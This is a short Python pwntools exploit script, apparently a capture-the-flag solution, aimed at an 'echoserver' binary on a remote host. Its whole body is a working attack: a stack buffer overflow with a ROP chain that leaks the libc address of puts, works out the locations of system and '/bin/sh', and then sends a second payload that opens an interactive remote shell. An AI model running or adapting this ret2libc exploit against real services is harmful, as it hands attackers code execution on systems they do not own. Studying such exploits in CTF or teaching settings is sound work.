from pwn import *
#p=process('./echoserver')
p=remote('125.235.240.166',20101)
libc = ELF('libc6_2.31-0ubuntu9_amd64.so')
elf = ELF('./echoserver')
pop = 0x00000000004012cb
main = 0x4011ae
ret = 0x0000000000401016
payload = "QUIT"
payload = payload.ljust(135,"a")
payload += "b"
payload += p64(pop)
payload += p64(elf.symbols['got.puts'])
payload += p64(elf.symbols['plt.puts'])
payload += p64(main)
p.sendline(payload)

p.recvuntil("ab")
p.recvuntil("\n")
puts_libc=u64((p.recv(6)+'\x00'*2))
log.info("puts_libc: "+hex(puts_libc))

puts_offset = libc.symbols['puts']
sys_offset =  libc.symbols['system']
bin_offset =  libc.search('/bin/sh').next()
base = puts_libc - puts_offset

system_thuc = base + sys_offset 
bin_thuc = base + bin_offset

payload = "QUIT"
payload = payload.ljust(135,"a")
payload += "b"
payload += p64(pop)

payload += p64(bin_thuc)
payload+=p64(ret)
payload += p64(system_thuc)
p.sendline(payload)


p.interactive()